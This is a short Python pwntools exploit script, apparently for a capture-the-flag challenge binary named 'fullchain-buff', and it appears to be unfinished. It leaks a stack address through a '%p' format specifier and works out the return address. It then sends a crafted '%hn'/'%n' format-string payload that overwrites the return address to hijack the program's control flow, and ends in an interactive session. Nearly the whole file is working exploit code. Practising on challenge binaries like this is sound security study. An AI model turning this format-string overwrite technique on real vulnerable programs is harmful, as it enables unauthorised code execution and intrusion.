#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'split', '-h']
context.arch = 'amd64'
context.binary = "./fullchain-buff"
# context.log_level = "debug"

# p = process("./fullchain-buff")
p = gdb.debug("./fullchain-buff", """
b chal
b mywrite
b myread
""")

def response_prompt(local_global, read_write):
    # print(local_global, read_write)
    p.sendlineafter(b"global or local > ", local_global)
    p.sendlineafter(b"read or write > ", read_write)



# gdb.attach(p, """
# b chal
# """)
response_prompt(b"local", b"write%p")
p.recvuntil(b"write0x")
local_addr = int(p.recv(12), 16)
ret_addr = local_addr - 0x18
last4_ret_addr = int("0x" + hex(ret_addr)[-4:], base=16)

print("local_addr", hex(local_addr))
print("ret_addr", hex(ret_addr), hex(last4_ret_addr))

argv1_addr = local_addr + 0x148
print("argv1_addr", hex(argv1_addr))

# hijack return address to chal_addr
# modify last two byte of "ret_addr" using fmt string bug
response_prompt(b"global", b"read")
# fmt = f'%{last4_ret_addr}c%25$hn' #  %4993c%21$hn %10c%25$hn
fmt = f'%{last4_ret_addr}c%40$hn %53$n'.encode()
print(fmt)
p.sendlineafter(b"length > ", str(len(fmt)))
p.sendline(fmt)

response_prompt(b"global", b"write")

p.recvuntil(b"0x")
local_addr = int(p.recv(12), 16)
ret_addr = local_addr + 0x8
print("ret_addr", hex(ret_addr))

p.interactive()